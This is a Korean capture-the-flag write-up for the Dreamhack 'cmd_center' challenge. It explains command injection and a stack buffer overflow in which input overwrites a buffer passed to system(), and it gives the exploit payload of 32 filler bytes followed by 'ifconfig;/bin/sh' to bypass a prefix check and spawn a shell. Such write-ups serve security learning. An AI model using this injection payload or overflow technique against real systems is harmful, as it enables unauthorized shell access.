

- **인젝션(Injection)**: 악의적인 데이터를 프로그램에 입력하여 이를 시스템 명령어, 코드, 데이터베이스 쿼리 등으로 실행되게 하는 기법
- **커맨드 인젝션(Command Injection)**: 인젝션의 종류 중 하나. 시스템 명령어에 대한 인젝션을 의미함. 취약점이 발생하는 원인은 단순하지만, 매우 치명적인 공격으로 이어질 수 있음. 개발자는 사용자의 입력을 반드시 검사해야 하며, 되도록 `system` 함수의 사용을 자제해야 함.
- **메타 문자(Meta Character)**: 셸 프로그램에서 특수하게 처리하는 문자. `;`를 사용하면 여러 개의 명령어를 순서대로 실행시킬 수 있음.

워게임

cmd_center

## **[문제분석](https://keyme2003.tistory.com/entry/dreamhack-cmdcenter#%EB%AC%B8%EC%A0%9C%EB%B6%84%EC%84%9D-1)**

---

```arduino
#include <stdio.h>
#include <string.h>
#include <unistd.h>
int main()
{

        char cmd_ip[256] = "ifconfig";
        int dummy;
        char center_name[24];

        init();

        printf("Center name: ");
        read(0, center_name, 100);

        if( !strncmp(cmd_ip, "ifconfig", 8)) {
                system(cmd_ip);
        }

        else {
                printf("Something is wrong!\n");
        }
        exit(0);
}
```

**코드 분석**

1. `center_name`에 100 바이트 입력을 받는다.
2. `cmd_ip` 첫 8바이트와 `"ifconfig"`를 비교하고 일치하면 `system(cmd_ip)`를 실행한다.

`center_name`는 24 바이트 크기의 배열이지만, 100 바이트 입력을 저장할 수 있다. 따라서 `center_name` 을 벗어나는 메모리 공간에 쓰기가 가능하고 `OOB`가 발생한다.

`center_name`이 `cmd_ip` 보다 스택에서 상단에 위치하기 때문에, 100 바이트 범위 내의 `cmd_ip` 영역이 존재한다면 `cmd_ip`를 임의의 데이터로 덮을 수 있다.

만약, `cmd_ip` 를 `"/bin/sh"`로 덮는다면, `system(cmd_ip) == system("/bin/sh")`가 실행되면서 쉘을 얻을 수 있다.

하지만 `cmd_ip` 첫 8바이트 값이 `"ifconfig"`인지 검증하는 로직이 있다. 따라서 적절하게 bypass 할 수 있도록 명령어를 구성해야한다.

예를 들면,

```
ifconfig;/bin/sh
```

와 같이 명령어를 구성하면 검증을 우회하고 쉘을 실행할 수 있다.

## **[문제풀이](https://keyme2003.tistory.com/entry/dreamhack-cmdcenter#%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4-1)**

---

목적은 `center_name`을 이용해서 `cmd_ip`를 `"ifconfig;/bin/sh"`으로 덮어쓰는 것이다. 따라서 `center_name ~ cmd_ip` 거리를 구해야한다.

### **○ read(0, center_name, 100)**

```
   0x0000000000000916 <+105>:   lea    rax,[rbp-0x130]
   0x000000000000091d <+112>:   mov    edx,0x64
   0x0000000000000922 <+117>:   mov    rsi,rax
   0x0000000000000925 <+120>:   mov    edi,0x0
   0x000000000000092a <+125>:   call   0x720 <read@plt>
```

### **○ system(cmd_ip)**

```
   0x000000000000094e <+161>:   lea    rax,[rbp-0x110]
   0x0000000000000955 <+168>:   mov    rdi,rax
   0x0000000000000958 <+171>:   call   0x700 <system@plt>
```

`center_name`은 `<main+105>`를 통해 `[rbp-0x130]`에 위치한다는 것을 알 수 있고 `cmd_ip`는 `<main+161>`를 통해 `[rbp-0x110]`에 위치한다는 것도 알 수 있다.

즉, `center_name ~ cmd_ip` 거리는 `0x130 - 0x110 = 0x20 = 32`이다.

그렇다면 payload는 다음과 같이 작성할 수 있다.

```csharp
[dummy] *32 + "ifconfig;/bin/sh"
```

![cmd_center.jpg](https://prod-files-secure.s3.us-west-2.amazonaws.com/a4983dbd-4924-435d-b0f1-3ca8d60a02fa/812fc3e4-8346-4997-ba32-65d086aadafc/cmd_center.jpg)

플래그 획득
